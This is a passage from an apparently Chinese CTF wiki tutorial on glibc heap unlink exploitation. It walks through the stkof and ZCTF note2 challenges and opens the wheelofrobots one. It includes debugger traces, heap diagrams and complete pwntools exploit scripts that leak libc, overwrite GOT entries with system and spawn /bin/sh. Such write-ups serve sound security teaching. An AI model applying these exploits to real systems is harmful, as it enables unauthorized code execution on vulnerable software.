2\uff0c\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u4ee5\u53ca\u6307\u5b9a\u5927\u5c0f\u5411\u6307\u5b9a\u5185\u5b58\u5904\uff0c\u8bfb\u5165\u6570\u636e\u3002 \u53ef\u89c1\uff0c\u8fd9\u91cc\u5b58\u5728\u5806\u6ea2\u51fa\u7684\u60c5\u51b5\uff0c\u56e0\u4e3a\u8fd9\u91cc\u8bfb\u5165\u5b57\u8282\u7684\u5927\u5c0f\u662f\u7531\u6211\u4eec\u6765\u63a7\u5236\u7684\u3002 3\uff0c\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u91ca\u653e\u5df2\u7ecf\u5206\u914d\u7684\u5185\u5b58\u5757\u3002 4\uff0c\u8fd9\u4e2a\u529f\u80fd\u5e76\u6ca1\u6709\u4ec0\u4e48\u5375\u7528\uff0c\u672c\u6765\u4ee5\u4e3a\u662f\u53ef\u4ee5\u8f93\u51fa\u5185\u5bb9\uff0c\u7ed3\u679c\u4ec0\u4e48\u4e5f\u6ca1\u6709\u8f93\u51fa\u3002\u3002 \u521d\u6b65\u6d4b\u8bd5 \u00b6 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709\u8fdb\u884c setbuf \u64cd\u4f5c\uff0c\u6240\u4ee5\u5728\u6267\u884c\u8f93\u5165\u8f93\u51fa\u64cd\u4f5c\u7684\u65f6\u5019\u4f1a\u7533\u8bf7\u7f13\u51b2\u533a\u3002\u8fd9\u91cc\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u4f1a\u7533\u8bf7\u4e24\u4e2a\u7f13\u51b2\u533a\uff0c\u5206\u522b\u5927\u5c0f\u4e3a1024 \u548c 1024\u3002\u5177\u4f53\u5982\u4e0b\uff0c\u53ef\u4ee5\u8fdb\u884c\u8c03\u8bd5\u67e5\u770b \u521d\u6b21\u8c03\u7528 fgets \u65f6\uff0cmalloc\u4f1a\u5206\u914d\u7f13\u51b2\u533a 1024 \u5927\u5c0f\u3002 *RAX 0x0 *RBX 0x400 *RCX 0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp rax, -0x1000 /* 'H=' */ *RDX 0x88 *RDI 0x400 *RSI 0x7fffffffd860 \u25c2\u2014 0x16 *R8 0x1 *R9 0x0 *R10 0x7ffff7fd2700 \u25c2\u2014 0x7ffff7fd2700 *R11 0x246 *R12 0xa *R13 0x9 R14 0x0 *R15 0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288 *RBP 0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288 *RSP 0x7fffffffd858 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov rsi, rax *RIP 0x7ffff7a91130 (malloc) \u25c2\u2014 push rbp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x7ffff7a91130 <malloc> push rbp <0x7ffff7dd18e0> ...\uff0c\u7701\u7565 \u25ba f 0 7ffff7a91130 malloc f 1 7ffff7a7a1d5 _IO_file_doallocate+85 f 2 7ffff7a88594 _IO_doallocbuf+52 f 3 7ffff7a8769c _IO_file_underflow+508 f 4 7ffff7a8860e _IO_default_uflow+14 f 5 7ffff7a7bc6a _IO_getline_info+170 f 6 7ffff7a7bd78 f 7 7ffff7a7ab7d fgets+173 f 8 400d2e f 9 7ffff7a2d830 __libc_start_main+240 \u5206\u914d\u4e4b\u540e\uff0c\u5806\u5982\u4e0b pwndbg> heap Top Chunk: 0xe05410 Last Remainder: 0 0xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05410 PREV_INUSE { prev_size = 0, size = 134129, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u5f53\u5206\u914d16\u5927\u5c0f\u7684\u5185\u5b58\u540e\uff0c\u5806\u5e03\u5c40\u5982\u4e0b pwndbg> heap Top Chunk: 0xe05430 Last Remainder: 0 0xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa3631, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05410 FASTBIN { prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x20bd1 } 0xe05430 PREV_INUSE { prev_size = 0, size = 134097, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u5f53\u4f7f\u7528 printf \u51fd\u6570\uff0c\u4f1a\u5206\u914d 1024 \u5b57\u8282\u7a7a\u95f4\uff0c\u5982\u4e0b *RAX 0x0 *RBX 0x400 *RCX 0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp rax, -0x1000 /* 'H=' */ *RDX 0x88 *RDI 0x400 *RSI 0x7fffffffd1c0 \u25c2\u2014 0x16 R8 0x0 *R9 0x0 *R10 0x0 *R11 0x246 *R12 0x1 *R13 0x7fffffffd827 \u25c2\u2014 0x31 /* '1' */ R14 0x0 *R15 0x400de4 \u25c2\u2014 and eax, 0x2e000a64 /* '%d\\n' */ *RBP 0x7ffff7dd2620 (_IO_2_1_stdout_) \u25c2\u2014 0xfbad2284 *RSP 0x7fffffffd1b8 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov rsi, rax *RIP 0x7ffff7a91130 (malloc) \u25c2\u2014 push rbp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x7ffff7a91130 <malloc> push rbp <0x7ffff7dd2620> \u3002\u3002\u3002\u7701\u7565 \u25ba f 0 7ffff7a91130 malloc f 1 7ffff7a7a1d5 _IO_file_doallocate+85 f 2 7ffff7a88594 _IO_doallocbuf+52 f 3 7ffff7a878f8 _IO_file_overflow+456 f 4 7ffff7a8628d _IO_file_xsputn+173 f 5 7ffff7a5ae00 vfprintf+3216 f 6 7ffff7a62899 printf+153 f 7 4009cd f 8 400cb1 f 9 7ffff7a2d830 __libc_start_main+240 \u5806\u5e03\u5c40\u5982\u4e0b pwndbg> heap Top Chunk: 0xe05840 Last Remainder: 0 0xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa3631, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05410 FASTBIN { prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x411 } 0xe05430 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa4b4f, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0xe05840 PREV_INUSE { prev_size = 0, size = 133057, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u6b64\u540e\uff0c\u65e0\u8bba\u662f\u8f93\u5165\u8f93\u51fa\u90fd\u4e0d\u4f1a\u518d\u7533\u8bf7\u7f13\u51b2\u53bb\u4e86\u3002\u6240\u4ee5\u6211\u4eec\u6700\u597d\u6700\u521d\u7684\u7533\u8bf7\u4e00\u4e2a chunk \u6765\u628a\u8fd9\u4e9b\u7f13\u51b2\u533a\u7ed9\u7533\u8bf7\u4e86\uff0c\u65b9\u4fbf\u4e4b\u540e\u64cd\u4f5c\u3002 \u4f46\u662f\uff0c\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u5982\u679c\u6211\u4eec\u662f attach \u4e0a\u53bb\u7684\u8bdd\uff0c\u7b2c\u4e00\u4e2a\u7f13\u51b2\u533a\u5206\u914d\u7684\u5927\u5c0f\u4e3a 4096 \u5927\u5c0f\u3002 pwndbg> heap Top Chunk: 0x1e9b010 Last Remainder: 0 0x1e9a000 PREV_INUSE { prev_size = 0, size = 4113, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } 0x1e9b010 PREV_INUSE { prev_size = 0, size = 135153, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0 } \u57fa\u672c\u601d\u8def \u00b6 \u6839\u636e\u4e0a\u9762\u5206\u6790\uff0c\u6211\u4eec\u5728\u524d\u9762\u5148\u5206\u914d\u4e00\u4e2a chunk \u6765\u628a\u7f13\u51b2\u533a\u5206\u914d\u5b8c\u6bd5\uff0c\u4ee5\u514d\u5f71\u54cd\u4e4b\u540e\u7684\u64cd\u4f5c\u3002 \u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709 leak\uff0c\u8981\u60f3\u6267\u884c system \u7b49\u51fd\u6570\uff0c\u6211\u4eec\u7684\u9996\u8981\u76ee\u7684\u8fd8\u662f\u5148\u6784\u9020 leak\uff0c\u57fa\u672c\u601d\u8def\u5982\u4e0b \u5229\u7528 unlink \u4fee\u6539 global[2] \u4e3a &global[2]-0x18\u3002 \u5229\u7528\u7f16\u8f91\u529f\u80fd\u4fee\u6539 global[0] \u4e3a free@got \u5730\u5740\uff0c\u540c\u65f6\u4fee\u6539 global[1] \u4e3aputs@got \u5730\u5740\uff0cglobal[2] \u4e3a atoi@got \u5730\u5740\u3002 \u4fee\u6539 free@got \u4e3a puts@plt \u7684\u5730\u5740\uff0c\u4ece\u800c\u5f53\u518d\u6b21\u8c03\u7528 free \u51fd\u6570\u65f6\uff0c\u5373\u53ef\u76f4\u63a5\u8c03\u7528 puts \u51fd\u6570\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u6cc4\u6f0f\u51fd\u6570\u5185\u5bb9\u3002 free global[2]\uff0c\u5373\u6cc4\u6f0f puts@got \u5185\u5bb9\uff0c\u4ece\u800c\u77e5\u9053 system \u51fd\u6570\u5730\u5740\u4ee5\u53ca libc \u4e2d /bin/sh \u5730\u5740\u3002 \u4fee\u6539 atoi@got \u4e3a system \u51fd\u6570\u5730\u5740\uff0c\u518d\u6b21\u8c03\u7528\u65f6\uff0c\u8f93\u5165 /bin/sh \u5730\u5740\u5373\u53ef\u3002 \u4ee3\u7801\u5982\u4e0b context . terminal = [ 'gnome-terminal' , '-x' , 'sh' , '-c' ] if args [ 'DEBUG' ]: context . log_level = 'debug' context . binary = \"./stkof\" stkof = ELF ( './stkof' ) if args [ 'REMOTE' ]: p = remote ( '127.0.0.1' , 7777 ) else : p = process ( \"./stkof\" ) log . info ( 'PID: ' + str ( proc . pidof ( p )[ 0 ])) libc = ELF ( './libc.so.6' ) head = 0x602140 def alloc ( size ): p . sendline ( '1' ) p . sendline ( str ( size )) p . recvuntil ( 'OK \\n ' ) def edit ( idx , size , content ): p . sendline ( '2' ) p . sendline ( str ( idx )) p . sendline ( str ( size )) p . send ( content ) p . recvuntil ( 'OK \\n ' ) def free ( idx ): p . sendline ( '3' ) p . sendline ( str ( idx )) def exp (): # trigger to malloc buffer for io function alloc ( 0x100 ) # idx 1 # begin alloc ( 0x30 ) # idx 2 # small chunk size in order to trigger unlink alloc ( 0x80 ) # idx 3 # a fake chunk at global[2]=head+16 who's size is 0x20 payload = p64 ( 0 ) #prev_size payload += p64 ( 0x20 ) #size payload += p64 ( head + 16 - 0x18 ) #fd payload += p64 ( head + 16 - 0x10 ) #bk payload += p64 ( 0x20 ) # next chunk's prev_size bypass the check payload = payload . ljust ( 0x30 , 'a' ) # overwrite global[3]'s chunk's prev_size # make it believe that prev chunk is at global[2] payload += p64 ( 0x30 ) # make it believe that prev chunk is free payload += p64 ( 0x90 ) edit ( 2 , len ( payload ), payload ) # unlink fake chunk, so global[2] =&(global[2])-0x18=head-8 free ( 3 ) p . recvuntil ( 'OK \\n ' ) #gdb.attach(p) # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got payload = 'a' * 8 + p64 ( stkof . got [ 'free' ]) + p64 ( stkof . got [ 'puts' ]) + p64 ( stkof . got [ 'atoi' ]) edit ( 2 , len ( payload ), payload ) # edit free@got to puts@plt payload = p64 ( stkof . plt [ 'puts' ]) edit ( 0 , len ( payload ), payload ) #free global[1] to leak puts addr free ( 1 ) puts_addr = p . recvuntil ( ' \\n OK \\n ' , drop = True ) . ljust ( 8 , ' \\x00 ' ) puts_addr = u64 ( puts_addr ) log . success ( 'puts addr: ' + hex ( puts_addr )) libc_base = puts_addr - libc . symbols [ 'puts' ] binsh_addr = libc_base + next ( libc . search ( '/bin/sh' )) system_addr = libc_base + libc . symbols [ 'system' ] log . success ( 'libc base: ' + hex ( libc_base )) log . success ( '/bin/sh addr: ' + hex ( binsh_addr )) log . success ( 'system addr: ' + hex ( system_addr )) # modify atoi@got to system addr payload = p64 ( system_addr ) edit ( 2 , len ( payload ), payload ) p . send ( p64 ( binsh_addr )) p . interactive () if __name__ == \"__main__\" : exp () 2016 ZCTF note2 \u00b6 \u5206\u6790\u7a0b\u5e8f \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u5148\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u7684\u4e3b\u8981\u529f\u80fd\u4e3a \u6dfb\u52a0note\uff0csize\u9650\u5236\u4e3a0x80\uff0csize\u4f1a\u88ab\u8bb0\u5f55\uff0cnote\u6307\u9488\u4f1a\u88ab\u8bb0\u5f55\u3002 \u5c55\u793anote\u5185\u5bb9\u3002 \u7f16\u8f91note\u5185\u5bb9\uff0c\u5176\u4e2d\u5305\u62ec\u8986\u76d6\u5df2\u6709\u7684note\uff0c\u5728\u5df2\u6709\u7684note\u540e\u9762\u6dfb\u52a0\u5185\u5bb9\u3002 \u91ca\u653enote\u3002 \u4ed4\u7ec6\u5206\u6790\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u51e0\u4e2a\u95ee\u9898 \u5728\u6dfb\u52a0note\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8bb0\u5f55note\u5bf9\u5e94\u7684\u5927\u5c0f\uff0c\u8be5\u5927\u5c0f\u4f1a\u7528\u4e8e\u63a7\u5236\u8bfb\u53d6note\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u8bfb\u53d6\u7684\u5faa\u73af\u53d8\u91cfi\u662f\u65e0\u7b26\u53f7\u53d8\u91cf\uff0c\u6240\u4ee5\u6bd4\u8f83\u65f6\u90fd\u4f1a\u8f6c\u6362\u4e3a\u65e0\u7b26\u53f7\u53d8\u91cf\uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u8f93\u5165size\u4e3a0\u65f6\uff0cglibc\u6839\u636e\u5176\u89c4\u5b9a\uff0c\u4f1a\u5206\u914d0x20\u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u7a0b\u5e8f\u8bfb\u53d6\u7684\u5185\u5bb9\u5374\u5e76\u4e0d\u53d7\u5230\u9650\u5236\uff0c\u6545\u800c\u4f1a\u4ea7\u751f\u5806\u6ea2\u51fa\u3002 \u7a0b\u5e8f\u5728\u6bcf\u6b21\u7f16\u8f91note\u65f6\uff0c\u90fd\u4f1a\u7533\u8bf70xa0\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u5728 free \u4e4b\u540e\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL\u3002 \u7b2c\u4e00\u4e2a\u95ee\u9898\u5bf9\u5e94\u5728ida\u4e2d\u7684\u4ee3\u7801\u5982\u4e0b unsigned __int64 __fastcall ReadLenChar ( __int64 a1 , __int64 a2 , char a3 ) { char v4 ; // [sp+Ch] [bp-34h]@1 char buf ; // [sp+2Fh] [bp-11h]@2 unsigned __int64 i ; // [sp+30h] [bp-10h]@1 __int64 v7 ; // [sp+38h] [bp-8h]@2 v4 = a3 ; for ( i = 0LL ; a2 - 1 > i ; ++ i ) { v7 = read ( 0 , & buf , 1uLL ); if ( v7 <= 0 ) exit ( - 1 ); if ( buf == v4 ) break ; * ( _BYTE * )( i + a1 ) = buf ; } * ( _BYTE * )( a1 + i ) = 0 ; return i ; } \u5176\u4e2di\u662funsigned\u7c7b\u578b\uff0ca2\u4e3aint\u7c7b\u578b\uff0c\u6240\u4ee5\u4e24\u8005\u5728for\u5faa\u73af\u76f8\u6bd4\u8f83\u7684\u65f6\u5019\uff0ca2-1\u7684\u7ed3\u679c-1\u4f1a\u88ab\u89c6\u4e3aunsigned\u7c7b\u578b\uff0c\u6b64\u65f6\uff0c\u5373\u6700\u5927\u7684\u6574\u6570\u3002\u6240\u4ee5\u8bf4\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u957f\u5ea6\u7684\u6570\u636e\uff0c\u8fd9\u91cc\u4e5f\u5c31\u662f\u540e\u9762\u6211\u4eec\u6ea2\u51fa\u6240\u4f7f\u7528\u7684\u529e\u6cd5\u3002 \u57fa\u672c\u601d\u8def \u00b6 \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u5229\u7528\u53d1\u73b0\u7684\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u4e3b\u8981\u5229\u7528\u4e86 fastbin \u7684\u673a\u5236\u3001unlink \u7684\u673a\u5236\u3002 \u4e0b\u9762\u4f9d\u6b21\u8fdb\u884c\u8bb2\u89e3\u3002 \u57fa\u672c\u64cd\u4f5c \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u5148\u628anote\u53ef\u80fd\u7684\u57fa\u672c\u64cd\u4f5c\u5217\u4e3e\u51fa\u6765\u3002 p = process ( './note2' ) note2 = ELF ( './note2' ) libc = ELF ( '/lib/x86_64-linux-gnu/libc.so.6' ) context . log_level = 'debug' def newnote ( length , content ): p . recvuntil ( 'option--->>' ) p . sendline ( '1' ) p . recvuntil ( '(less than 128)' ) p . sendline ( str ( length )) p . recvuntil ( 'content:' ) p . sendline ( content ) def shownote ( id ): p . recvuntil ( 'option--->>' ) p . sendline ( '2' ) p . recvuntil ( 'note:' ) p . sendline ( str ( id )) def editnote ( id , choice , s ): p . recvuntil ( 'option--->>' ) p . sendline ( '3' ) p . recvuntil ( 'note:' ) p . sendline ( str ( id )) p . recvuntil ( '2.append]' ) p . sendline ( str ( choice )) p . sendline ( s ) def deletenote ( id ): p . recvuntil ( 'option--->>' ) p . sendline ( '4' ) p . recvuntil ( 'note:' ) p . sendline ( str ( id )) \u751f\u6210\u4e09\u4e2anote \u00b6 \u8fd9\u4e00\u90e8\u5206\u5bf9\u5e94\u7684\u4ee3\u7801\u5982\u4e0b # chunk0: a fake chunk ptr = 0x0000000000602120 fakefd = ptr - 0x18 fakebk = ptr - 0x10 content = 'a' * 8 + p64 ( 0x61 ) + p64 ( fakefd ) + p64 ( fakebk ) + 'b' * 64 + p64 ( 0x60 ) #content = p64(fakefd) + p64(fakebk) newnote ( 128 , content ) # chunk1: a zero size chunk produce overwrite newnote ( 0 , 'a' * 8 ) # chunk2: a chunk to be overwrited and freed newnote ( 0x80 , 'b' * 16 ) \u5176\u4e2d\u8fd9\u4e09\u4e2anote\u7684\u5927\u5c0f\u5206\u522b\u4e3a0x80\uff0c0\uff0c0x80\uff0c\u7b2c\u4e8c\u4e2achunk\u867d\u7136\u7533\u8bf7\u7684\u5927\u5c0f\u4e3a0\uff0c\u4f46\u662fglibc\u7684\u8981\u6c42chunk\u5757\u81f3\u5c11\u53ef\u4ee5\u5b58\u50a84\u4e2a\u5fc5\u8981\u7684\u5b57\u6bb5(prev_size,size,fd,bk)\uff0c\u6240\u4ee5\u4f1a\u5206\u914d0x20\u7684\u7a7a\u95f4\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u65e0\u7b26\u53f7\u6574\u6570\u7684\u6bd4\u8f83\u95ee\u9898\uff0c\u53ef\u4ee5\u4e3a\u8be5note\u8f93\u5165\u4efb\u610f\u957f\u7684\u5b57\u7b26\u4e32\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cchunk1\u4e2d\u4e00\u5171\u6784\u9020\u4e86\u4e24\u4e2achunk chunk ptr[0]\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86unlink\u65f6\u4fee\u6539\u5bf9\u5e94\u7684\u503c\u3002 chunk ptr[0]'s nextchunk\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86\u4f7f\u5f97unlink\u65f6\u7684\u7b2c\u4e00\u4e2a\u68c0\u67e5\u6ee1\u8db3\u3002 // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ \u5f53\u6784\u9020\u5b8c\u4e09\u4e2a note \u540e\uff0c\u5806\u7684\u57fa\u672c\u6784\u9020\u5982\u56fe1\u6240\u793a\u3002 +-----------------+ high addr | ... | +-----------------+ | 'b'*8 | ptr[2]-----------> +-----------------+ | size=0x91 | +-----------------+ | prevsize | +-----------------+------------ | unused | +-----------------+ | 'a'*8 | ptr[1]----------> +-----------------+ chunk 1 | size=0x20 | +-----------------+ | prevsize | +-----------------+------------- | unused | +-----------------+ | prev_size=0x60 | fake ptr[0] chunk's nextchunk----->+-----------------+ | 64*'a' | +-----------------+ | fakebk | +-----------------+ | fakefd | +-----------------+ | 0x61 | chunk 0 +-----------------+ | 'a *8 | ptr[0]----------> +-----------------+ | size=0x91 | +-----------------+ | prev_size | +-----------------+ low addr \u56fe1 \u91ca\u653echunk1-\u8986\u76d6chunk2-\u91ca\u653echunk2 \u00b6 \u5bf9\u5e94\u7684\u4ee3\u7801\u5982\u4e0b # edit the chunk1 to overwrite the chunk2 deletenote ( 1 ) content = 'a' * 16 + p64 ( 0xa0 ) + p64 ( 0x90 ) newnote ( 0 , content ) # delete note 2 to trigger the unlink # after unlink, ptr[0] = ptr - 0x18 deletenote ( 2 ) \u9996\u5148\u91ca\u653e chunk1\uff0c\u7531\u4e8e\u8be5chunk\u5c5e\u4e8efastbin\uff0c\u6240\u4ee5\u4e0b\u6b21\u5728\u7533\u8bf7\u7684\u65f6\u5019\u4ecd\u7136\u4f1a\u7533\u8bf7\u5230\u8be5chunk\uff0c\u540c\u65f6\u7531\u4e8e\u4e0a\u9762\u6240\u8bf4\u7684\u7c7b\u578b\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u5b57\u7b26\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u8986\u76d6chunk3\uff0c\u8986\u76d6\u4e4b\u540e\u5982\u56fe2\u6240\u793a\u3002 +-----------------+high addr | ... | +-----------------+ | '\\x00'+'b'*7 | ptr[2]-----------> +-----------------+ chunk 2 | size=0x90 | +-----------------+ | 0xa0 | +-----------------+------------ | 'a'*8 | +-----------------+ | 'a'*8 | ptr[1]----------> +-----------------+ chunk 1 | size=0x20 | +-----------------+ | prevsize | +-----------------+------------- | unused | +-----------------+ | prev_size=0x60 | fake ptr[0] chunk's nextchunk----->+-----------------+ | 64*'a' | +-----------------+ | fakebk | +-----------------+ | fakefd | +-----------------+ | 0x61 | chunk 0 +-----------------+ | 'a *8 | ptr[0]----------> +-----------------+ | size=0x91 | +-----------------+ | prev_size | +-----------------+ low addr \u56fe2 \u8be5\u8986\u76d6\u4e3b\u8981\u662f\u4e3a\u4e86\u91ca\u653echunk2\u7684\u65f6\u5019\u53ef\u4ee5\u540e\u5411\u5408\u5e76\uff08\u5408\u5e76\u4f4e\u5730\u5740\uff09\uff0c\u5bf9chunk0\u4e2d\u865a\u62df\u6784\u9020\u7684chunk\u8fdb\u884cunlink\u3002\u5373\u5c06\u8981\u6267\u884c\u7684\u64cd\u4f5c\u4e3aunlink(ptr[0])\uff0c\u540c\u65f6\u6211\u4eec\u6240\u6784\u9020\u7684fakebk\u548cfakefd\u6ee1\u8db3\u5982\u4e0b\u7ea6\u675f if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ unlink\u6210\u529f\u6267\u884c\uff0c\u4f1a\u5bfc\u81f4ptr[0]\u6240\u5b58\u50a8\u7684\u5730\u5740\u53d8\u4e3afakebk\uff0c\u5373ptr-0x18\u3002 \u83b7\u53d6system\u5730\u5740 \u00b6 \u4ee3\u7801\u5982\u4e0b # overwrite the chunk0(which is ptr[0]) with got atoi atoi_got = note2 . got [ 'atoi' ] content = 'a' * 0x18 + p64 ( atoi_got ) editnote ( 0 , 1 , content ) # get the aoti addr shownote ( 0 ) sh . recvuntil ( 'is ' ) atoi_addr = sh . recvuntil ( ' \\n ' , drop = True ) print atoi_addr atoi_addr = u64 ( atoi_addr . ljust ( 8 , ' \\x00 ' )) print 'leak atoi addr: ' + hex ( atoi_addr ) # get system addr atoi_offest = libc . symbols [ 'atoi' ] libcbase = atoi_addr - atoi_offest system_offest = libc . symbols [ 'system' ] system_addr = libcbase + system_offest print 'leak system addr: ' , hex ( system_addr ) \u6211\u4eec\u4fee\u6539ptr[0]\u7684\u5185\u5bb9\u4e3a ptr \u7684\u5730\u5740-0x18\uff0c\u6240\u4ee5\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 note0 \u65f6\uff0c\u53ef\u4ee5\u8986\u76d6ptr[0]\u7684\u5185\u5bb9\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u5176\u8986\u76d6\u4e3aatoi\u7684\u5730\u5740\u3002 \u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u6211\u4eec\u67e5\u770bnote 0\u7684\u5185\u5bb9\uff0c\u5176\u5b9e\u67e5\u770b\u7684\u5c31\u662fatoi\u7684\u5730\u5740\u3002 \u4e4b\u540e\u6211\u4eec\u6839\u636e libc \u4e2d\u5bf9\u5e94\u7684\u504f\u79fb\u8ba1\u7b97\u51fa system \u7684\u5730\u5740\u3002 \u4fee\u6539atoi got \u00b6 # overwrite the atoi got with systemaddr content = p64 ( system_addr ) editnote ( 0 , 1 , content ) \u7531\u4e8e\u6b64\u65f6 ptr[0] \u7684\u5730\u5740 got \u8868\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u8be5 note\uff0c\u8986\u76d6\u4e3a system \u5730\u5740\u3002 get shell \u00b6 # get shell sh . recvuntil ( 'option--->>' ) sh . sendline ( '/bin/sh' ) sh . interactive () \u6b64\u65f6\u5982\u679c\u6211\u4eec\u518d\u8c03\u7528 atoi \uff0c\u5176\u5b9e\u8c03\u7528\u7684\u5c31\u662f system \u51fd\u6570\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u62ff\u5230shell\u4e86\u3002 2017 insomni'hack wheelofrobots \u00b6 \u57fa\u672c\u4fe1\u606f \u00b6 \u279c 2017_insomni 'hack_wheelofrobots git:(master) file wheelofrobots wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=48a9cceeb7cf8874bc05ccf7a4657427fa4e2d78, stripped \u279c 2017_insomni' hack_wheelofrobots git: ( master ) checksec wheelofrobots [ * ] \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2017_insomni'hack_wheelofrobots/wheelofrobots\" Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u52a8\u6001\u94fe\u63a564\u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 canary \u4fdd\u62a4\u4e0e nx \u4fdd\u62a4\u3002 \u57fa\u672c\u529f\u80fd \u00b6 